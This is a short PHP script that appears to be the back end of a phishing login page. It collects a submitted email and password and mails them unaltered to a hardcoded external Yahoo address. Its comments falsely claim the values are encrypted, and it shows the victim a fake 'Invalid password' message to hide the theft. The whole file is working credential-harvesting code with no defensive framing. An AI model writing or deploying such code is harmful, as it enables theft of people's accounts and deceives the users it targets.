<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Retrieve the submitted username and password
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Encrypt or hash the username and password
  // Note: You should use a secure encryption/hashing algorithm
  // This example uses simple base64 encoding for demonstration purposes only
  $encryptedemail = trim($email);
  $encryptedPassword = trim($password);

  // Compose the email content
  $emailSubject = "Login Information";
  $emailBody = "Encrypted Username: " . $encryptedemail . "\n";
  $emailBody .= "Encrypted Password: " . $encryptedPassword;

  // Set the recipient email address
  $recipientEmail = "chosenbrainy123@yahoo.com";

  // Send the email
  mail($recipientEmail, $emailSubject, $emailBody);

  // Optional: Provide a response back to the JavaScript
  echo "Invalid password. Please try again";
}
?>